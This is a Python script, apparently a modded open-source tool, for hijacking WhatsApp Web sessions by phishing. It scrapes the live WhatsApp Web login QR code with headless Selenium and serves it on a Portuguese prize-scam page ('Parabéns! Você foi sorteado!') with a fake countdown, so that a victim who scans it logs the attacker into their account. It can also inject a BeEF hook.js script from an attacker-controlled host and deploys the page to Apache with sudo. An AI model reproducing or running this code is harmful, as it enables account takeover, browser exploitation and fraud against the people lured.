# Author: https://github.com/zr0n
# modded by https://github.com/wrxxnch
# Modified for BeEF Integration and Apache2 Hosting

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import base64
from time import sleep
import os
import http.server
import socketserver
import threading
import subprocess
import time
import requests
import random
import socket
import psutil
import signal
import shutil

# Configurações
PHISHING_PORT = random.randint(8000, 9000)

# HTML Base
PHISHING_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parabéns! Você foi sorteado!</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
        .container { max-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; }
        .qr-code { max-width: 300px; margin: 0 auto; }
        .qr-code img { width: 100%; height: auto; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
    </style>
    {BEEF_HOOK}
</head>
<body>
    <div class="container">
        <div class="whatsapp-logo">📱</div>
        <h1>🎉 PARABÉNS! VOCÊ FOI SORTEADO! 🎉</h1>
        <div class="prize">🏆 PRÊMIO: iPhone 15 Pro Max + R$ 5.000 🏆</div>
        <p>Para validar e resgatar seu prêmio, <strong>faça login no WhatsApp Web</strong> escaneando o QR Code abaixo:</p>
        <div class="qr-container">
            <div class="qr-code">
                <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code do WhatsApp" id="qrImage">
            </div>
        </div>
        <div class="timer">⏳ TEMPO RESTANTE: <span id="countdown">05:00</span></div>
        <div class="instructions">
            <h3>📋 Como resgatar seu prêmio:</h3>
            <ol>
                <li>Abra o WhatsApp no seu celular</li>
                <li>Toque em <strong>Menu → WhatsApp Web</strong></li>
                <li>Aponte a câmera para o QR Code acima</li>
                <li>Seu prêmio será liberado automaticamente após o login!</li>
            </ol>
        </div>
        <p><strong>⚠️ ATENÇÃO:</strong> Você tem apenas 5 minutos para escanear o QR code e garantir seu prêmio!</p>
    </div>

    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 3000);
        }
        function startCountdown() {
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = "TEMPO ESGOTADO!";
                    countdownElement.style.color = "#D32F2F";
                }
                timeLeft--;
            }, 1000);
        }
        updateQRCode();
        startCountdown();
        window.onload = function() {
           <script></scripts>
        };
    </script>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_with_timestamp = PHISHING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            self.wfile.write(html_with_timestamp.encode())
        elif self.path.startswith('/qr.png'):
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                with open('qr.png', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def deploy_to_apache(html_content):
    """Hospeda o ataque no Apache2 (/var/www/html)"""
    try:
        print("[*] Implantando no Apache2 (/var/www/html)...")
        # Salva o HTML
        with open("/tmp/index.html", "w") as f:
            f.write(html_content)
        
        # Move para /var/www/html usando sudo
        subprocess.run(["sudo", "mv", "/tmp/index.html", "/var/www/html/index.html"], check=True)
        
        # Copia o QR Code para a pasta do apache
        if os.path.exists("qr.png"):
            subprocess.run(["sudo", "cp", "qr.png", "/var/www/html/qr.png"], check=True)
        
        # Reinicia Apache
        subprocess.run(["sudo", "systemctl", "restart", "apache2"], check=True)
        print("✅ attack server successful on Apache2!")
        return True
    except Exception as e:
        print(f"Error on Apache start: {e}")
        return False

def kill_process_on_port(port):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                connections = proc.connections()
                for conn in connections:
                    if conn.laddr.port == port:
                        os.kill(proc.pid, signal.SIGTERM)
                        time.sleep(2)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass

def start_phishing_server():
    global PHISHING_PORT
    try:
        kill_process_on_port(PHISHING_PORT)
        with socketserver.TCPServer(("", PHISHING_PORT), PhishingHandler) as httpd:
            print(f"✅Local server on port: {PHISHING_PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"❌ Erro no servidor: {e}")

def start_whatsapp_hijacking():
    print("\nInitializing WHATSAPP SESSION HIJACKING")
    try:
        from selenium.webdriver.firefox.options import Options
        options = Options()
        options.add_argument("--headless") # Headless para não abrir janela
        browser = webdriver.Firefox(options=options)
        browser.get("https://web.whatsapp.com/")

        print("Waiting for QR Code...")
        canvas = WebDriverWait(browser, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "canvas"))
        )

        def get_canvas_base64():
            try:
                canvas = browser.find_element(By.CSS_SELECTOR, "canvas")
                return browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
            except: return None

        src = get_canvas_base64()
        if src:
            base64_data = src.replace("data:image/png;base64,", "")
            with open("qr.png", "wb") as f:
                f.write(base64.b64decode(base64_data))
            print("✅ QR Code inicial salvo")

        print("Waiting for victim scan QR Code...")
        while True:
            try:
                # Tenta recarregar QR se necessário
                try:
                    browser.find_element(By.XPATH, "//span[contains(text(), 'Reload')]").click()
                except: pass
                
                new_src = get_canvas_base64()
                if new_src and new_src != src:
                    src = new_src
                    with open("qr.png", "wb") as f:
                        f.write(base64.b64decode(src.replace("data:image/png;base64,", "")))
            except TimeoutException:
                print("victim captured")
                break
            time.sleep(5)
        return browser
    except Exception as e:
        print(f"❌ Erro: {e}")
        return None

def main():
    print("🚀 CONFIGURAÇÃO DO ATAQUE")
    
    # Inputs solicitados
    use_beef = input("Deseja usar BeEF XSS? (Y/n): ").lower() == 'y'
    target_host = input("Digite o Host (ex: 192.168.1.10): ")
    target_port = input("Digite a Porta (ex: 80): ")
    
    hosting_method = input("Onde hospedar? (1) Servidor Python Local (2) Apache2 /var/www/html: ")
    
    beef_hook = ""
    if use_beef:
        beef_host = input("Digite o Host do BeEF: ")
        beef_port = input("Digite a Porta do BeEF: ")
        # Script hook.js simulado via tag script
        beef_hook = f'<script src="http://{beef_host}:{beef_port}/hook.js"></script>'
    
    # Processa HTML final
    final_html = PHISHING_HTML.replace("{BEEF_HOOK}", beef_hook)
    
    if hosting_method == '2':
        if deploy_to_apache(final_html):
            print(f"🌐 Ataque disponível em: http://{target_host}:{target_port}")
    else:
        server_thread = threading.Thread(target=start_phishing_server, daemon=True)
        server_thread.start()
        print(f"🌐 Ataque disponível em: http://{target_host}:{PHISHING_PORT}")

    # Iniciar captura do WhatsApp
    browser = start_whatsapp_hijacking()
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        if browser: browser.quit()
        print("\n🛑 Encerrando...")

if __name__ == "__main__":
    main()
